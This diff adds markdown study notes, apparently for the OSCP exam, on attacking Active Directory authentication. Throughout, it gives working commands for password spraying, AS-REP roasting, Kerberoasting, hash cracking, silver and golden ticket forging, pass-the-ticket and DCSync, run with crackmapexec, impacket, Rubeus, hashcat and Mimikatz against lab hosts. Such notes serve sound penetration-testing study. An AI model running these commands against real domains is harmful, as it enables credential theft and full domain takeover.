@@ -1,0 +1,229 @@
+# Module 23 Attacking Active Directory Authentication
+
+
+## 22.2.1 Password Attack
+
+> refer to crackmapexec cheatsheet
+
+**Password Spraying**
+```bash
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+> Username list /usr/share/seclists/Usernames/Names/names.txt
+
+---
+
+## 23.2.2 AS-REP Roasting
+
+**Check for Kerberos preauthentication**
+```bash
+impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat
+
+#Example, with user authenticated.
+impacket-GetNPUsers corp.com/pete -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast 
+```
+
+**Rubeus.exe**
+> Run on windows
+```powershell
+Rubeus.exe asreproast /outfile:hashes.txt
+```
+
+**Kerboroasting**
+```bash
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+When you'd use Rubeus over Impacket:
+
+- You already have a shell on a domain-joined Windows machine
+- You want to work from inside the domain context (uses the current user's Kerberos tickets automatically)
+- You need to extract tickets from the machine's memory
+
+When you'd use Impacket instead:
+
+- You're attacking from Kali with just credentials
+- You don't have a Windows foothold
+- You're going through a pivot
+
+
+**Get users.txt**
+```bash
+# If you have any valid creds, dump all usernames first
+crackmapexec smb <DC_IP> -u user -p 'password' --users
+```
+
+---
+
+## 23.2.3 Kerboroasting
+
+Remember SPNs (Service Principal Names) — they link a service to the domain account running it. Kerberoasting exploits this:
+
+1. Any authenticated domain user can request a service ticket (TGS) for any SPN
+2. That ticket is encrypted with the service account's password hash
+3. You request the ticket, extract it, and crack it offline to recover the service account's password
+
+
+**Using impacket**
+```bash
+# Request TGS tickets for all Kerberoastable accounts
+impacket-GetUserSPNs corp.com/pete:'password' -dc-ip 192.168.132.70 -request -outputfile kerberoast.txt
+
+# Then crack the .txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+**Using Rubeus**
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+
+---
+
+## 23.2.4 Silver Ticket
+
+> Forge a Kerberos service ticket (TGS) to access a specific service as any user — including a fake Domain Admin — without contacting the DC. Lower priority for OSCP (skim), but know the concept.
+
+---
+
+### The Concept
+
+A **silver ticket** is a forged TGS (service ticket) for ONE specific service on ONE machine. Because a service ticket is encrypted with the **service account's password hash**, if you have that hash, you can forge a valid ticket for that service and impersonate any user to it — even a Domain Admin.
+
+**Silver vs Golden ticket:**
+| | Silver Ticket | Golden Ticket |
+|---|--------------|---------------|
+| Forged with | A service account's hash (e.g. a machine account) | The KRBTGT account's hash |
+| Grants access to | ONE service on ONE host | The ENTIRE domain (any service) |
+| Contacts DC? | No (stealthier) | No |
+| Scope | Narrow | Total domain control |
+
+Silver = one service. Golden = whole domain (needs KRBTGT hash from DCSync).
+
+---
+
+### What You Need for a Silver Ticket
+
+1. **The service account's NTLM hash** (or AES key) — often a machine account hash (`MACHINE$`) or a service account you Kerberoasted
+2. **The domain SID**
+3. **The SPN** of the target service (e.g. `cifs/files04.corp.com`)
+4. **The username** you want to impersonate (e.g. Administrator)
+
+---
+
+### Getting the Pieces
+
+**Domain SID:**
+```bash
+# From Kali with creds
+impacket-lookupsid corp.com/user:pass@<DC_IP>
+# or on Windows
+whoami /user      # SID minus the last RID chunk
+```
+
+**Service account hash:**
+- Machine account hash → from `secretsdump` or Mimikatz on a compromised host
+- Service account hash → from Kerberoasting + cracking, or dumped hashes
+
+---
+
+### Forging a Silver Ticket
+
+#### Impacket (from Kali)
+```bash
+# Forge the ticket
+impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain corp.com -spn cifs/files04.corp.com Administrator
+
+# This creates Administrator.ccache
+export KRB5CCNAME=Administrator.ccache
+
+# Use it (pass-the-ticket)
+impacket-psexec -k -no-pass corp.com/Administrator@files04.corp.com
+```
+
+#### Mimikatz (on Windows)
+```
+kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN_SID> /target:files04.corp.com /service:cifs /rc4:<SERVICE_HASH> /ptt
+```
+(Mimikatz uses `golden` command syntax for silver tickets too — the difference is supplying a service hash + target/service instead of the KRBTGT hash.)
+
+---
+
+### Common SPN Service Types
+
+| Service | SPN prefix | Access gained |
+|---------|-----------|---------------|
+| File shares (SMB) | `cifs/` | Read/write files, PsExec |
+| PowerShell Remoting | `http/` | WinRM |
+| Scheduled tasks | `host/` | Task creation |
+| WMI | `host/`, `rpcss/` | WMI execution |
+| MSSQL | `mssqlsvc/` | Database access |
+
+---
+
+### The Attack Flow
+
+```
+1. Compromise a host, dump the machine/service account hash (secretsdump)
+2. Get the domain SID
+3. Forge a silver ticket for a target service (cifs/host)
+   impersonating Administrator
+4. Inject the ticket (pass-the-ticket / ccache)
+5. Access that service as Administrator
+```
+
+---
+
+### When to Use It (OSCP context)
+
+- **Rarely the intended path** on OSCP — Kerberoasting, AS-REP roasting, and DCSync are far more common.
+- Useful when you have a **service/machine account hash** but not a full DA path, and need to access a specific service.
+- **Golden ticket** (KRBTGT-based) is more powerful but requires DCSync first — at which point you already own the domain.
+
+**Priority: SKIM.** Understand the concept (forge a ticket with a service hash to impersonate anyone to that service). Don't grind the mechanics — the roasting attacks and DCSync are what you'll actually use.
+
+---
+
+### Golden Ticket (brief, for completeness)
+
+Requires the **KRBTGT hash** (obtained via DCSync). Forges a TGT granting access to the entire domain as any user.
+
+```bash
+impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.com Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.com/Administrator@dc1.corp.com
+```
+
+By the time you can make a golden ticket, you've already DCSynced the domain — so it's mostly a persistence technique.
+
+---
+
+### Key Notes
+
+- Silver ticket = one service, needs that service's hash. Golden ticket = whole domain, needs KRBTGT hash.
+- Both are forged offline — no DC contact for creation (stealthy).
+- For OSCP, prioritize Kerberoasting / AS-REP / DCSync over ticket forging.
+- `impacket-ticketer` (forge) + `KRB5CCNAME` (load) + `-k -no-pass` (use) is the Kali workflow.
+
+---
+
+
+## 23.2.5 Domain Controller Sync
+
+A DCSync attack is a malicious technique where an attacker pretends to be a legitimate Windows Domain Controller (DC) to steal password hashes from a real DC. It abuses normal Active Directory replication functions using the Directory Replication Service Remote Protocol (MS-DRSR) without running code on the target server's local memory
+
+
+**How the Attack WorksPrivilege Requirement:** 
+1. The attacker needs an account that already has directory replication rights, such as Domain Admin, Enterprise Admin, or a custom configured account.
+2. Impersonation Request: Using tools like Mimikatz or Impacket, the attacker sends a replication request (GetNCChanges) to a real Domain Controller.
+3. Data Extraction: The real DC trusts the request and hands over sensitive user data, including NTLM password hashes and the krbtgt account hash, which allows attackers to create Golden Tickets for total domain control
+
+
+**How it works**
+```powershell
+#Start mimikatz
+.\mimikatz.exe
+
+#On mimikatz
+lsadump::dcsync /user:corp\user
+```
